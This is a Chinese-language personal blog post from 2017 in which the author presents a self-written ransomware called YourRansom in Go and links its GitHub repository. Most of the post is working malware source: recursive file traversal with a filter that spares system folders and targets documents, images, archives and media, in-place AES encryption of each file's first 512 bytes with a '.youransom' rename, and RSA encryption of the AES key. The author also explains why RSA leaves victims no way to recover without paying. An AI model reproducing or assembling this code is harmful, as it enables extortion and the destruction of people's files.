---
title: 自制勒索有感&技术简析
date: 2017-01-10
categories:
 - 手记
---

嘛自从去年10月更过博客之后就啥都没写过了。。。这次正好趁着卫队搞新年活动写点什么。

前段时间在卡饭，勒索病毒是很火的一个讨论话题，而我也跟着一位大神的风写了一个简单的勒索病毒，这里写一点东西，作为纪念。

说起勒索病毒，其实它的行为和技术都很简单（除了某些硬肛硬盘的品种之外，当然我们今天讨论的只有普通的文件加密病毒，像cerber那样的）
其主要行为由遍历和加密两部分组成，下面在下使用自己的代码分析一下这两部分的实现（代码较渣还请原谅

首先是遍历，这一部分十分简单，不过还有一个很重要的问题需要注意：不要无脑。先前在下的第一版YourRansom就是因为无脑遍历进了系统文件夹还试图加密才被。。。
闲话不多说，先上代码：

```golang
func do_cAll(path string, cip cipher.Block, action byte) error {

	//	获取一下路径的信息
	dir, serr := os.Stat(path)
	if serr != nil {
		return serr
	}
	//	判断是否是个目录，如果不是就交给加(解)密处理
	if !dir.IsDir() {
		if action == 'e' && !filter(path, action) {
			return nil
		}
		fmt.Println("File: ", path)
		switch action {
		case 'e':
			encrypt(path, cip)
		case 'd':
			decrypt(path, cip)
		}
	}

	//	既然到这里了那就是个目录了，让我们继续遍历
	fmt.Println("Path: ", path)
	//	先打开这个目录
	fd, err := os.Open(path)
	if err != nil {
		return err
	}
	//	获取到目录下前100个文件名
	names, err1 := fd.Readdirnames(100)
	if len(names) == 0 || err1 != nil {
		return nil
	}
	//	为每一个文件名迭代一遍自身
	for _, name := range names {
		do_cAll(path+string(os.PathSeparator)+name, cip, action)
	}
	return nil
}
```

其中为了防止无脑遍历我上了一个filter函数，用于判断传入的目录或文件名是否有关键词，以确认是否可以肛(虽然实现还是很无脑)：
```golang
func filter(path string, action byte) bool {

	//	将传入的路径转为全小写，便于判断
	lowPath := strings.ToLower(path)

	//	屏蔽和加密后缀列表
	innerList := []string{"windows", "program", "appdata", "system"}
	suffixList := []string{".txt", ".zip", ".rar", ".7z", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx", ".jpg", ".gif", ".jpeg", ".png", ".mpg", ".mov", ".mp4", ".avi", ".mp3"}

	//	判断路径中是否包含敏感词(大雾)
	for _, inner := range innerList {
		if strings.Contains(lowPath, inner) {
			//		如果存在就返回false
			return false
		}
	}
	//	判断路径是否以加密后缀结尾
	for _, suffix := range suffixList {
		if strings.HasSuffix(lowPath, suffix) {
			//			如果是就返回true
			return true
		}
	}
	//	既然到这里了那肯定就是既不包含敏感词，也没有加密后缀名的，还是false
	return false
}
```

嗯，这样遍历就实现完成了，接下来是加密这个重头戏。得益于Golang内置库的完备，我们可以直接import一个`crypto/aes`包来实现aes的加解密。
下面是aes加密的实现：

```golang
func encrypt(filename string, cip cipher.Block) error {

	//	判断该文件是否已加密了
	if len(filename) >= 11 && filename[len(filename)-10:] == ".youransom" {
		fmt.Println("Warning: A encrypted file found.")
		return nil
	}

	//	试图打开文件用于写入
	f, err := os.OpenFile(filename, os.O_RDWR, 0)
	fmt.Println("Encrypt: ", filename)
	if err != nil {
		return err
	}
	fstat, _ := f.Stat()
	size := fstat.Size()

	//	开始循环加密
	buf, out := make([]byte, 16), make([]byte, 16)
	for offset := int64(0); size-offset > 16 && offset < 512; offset += 16 {
		f.ReadAt(buf, offset)
		cip.Encrypt(out, buf)
		f.WriteAt(out, offset)
	}

	//	关闭文件并添加后缀
	f.Close()
	os.Rename(filename, filename+".youransom")
	return nil
}
```

嗯，在下很贴心地添加了防止二次加密的相关判断用于保护用户的数据安全，多么贴心啊(滑稽

相信有不少兄弟在看到aes加密的时候都是一脸蒙蔽状态：这是啥为啥我看不明白。其实不需要在意太多，因为是全黑盒的所以只要用就好了。
不过基础知识还是要知道的，这里在下简单地说一下：

AES是一种对称加密算法，通常我们可以认为在没有密钥的情况下是无法解密AES的。而所谓对称加密，可以理解为像通常我们理解的加解密那样，用同一个密钥既能加密，也能解密。
这背后是有比较复杂的数学原理的，喜欢探究而且高数成绩不错的同学可以试试去wiki的aes页面看一眼。

毫无疑问AES的性能是很高的，而通常我们看到的勒索却大都写着使用RSA加密，这是一个显而易见的原因的，就是AES是对称加密。
我们很难去简单的使用对称加密实现一个“用户被加密之后不管怎么搞都解不了密只能乖乖交钱”的场景，无论是发送到服务器，还是保存到本地，都是很危险的。
还记得曾经有一个国产加密使用AES还直接把密钥存到本地最后没收到钱还被嘲讽了一番的悲伤故事么？

而这种场景交由rsa实现简直不能再棒了：
RSA是一种非对称加密，它有两个密钥：用其中一个密钥加密的数据只有用另一个密钥才能解密。这就完美地消除了将密钥存储在本地的危险。

下面是在下使用rsa加密aes密钥的实现：

```golang
func saveKey(cip []byte) {
	keyFile, _ := os.Create("YourRansom.key")
	block, _ := pem.Decode(pubKey)
	pubI, _ := x509.ParsePKIXPublicKey(block.Bytes)
	pub := pubI.(*rsa.PublicKey)
	word, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, cip)
	keyFile.WriteAt(word, 0)
	return
}
```

最后把它们拼在一起，就成为了YourRansom，一个简单至极的自制勒索。

Github：[https://github.com/popu125/YourRansom](https://github.com/popu125/YourRansom)

17/01/17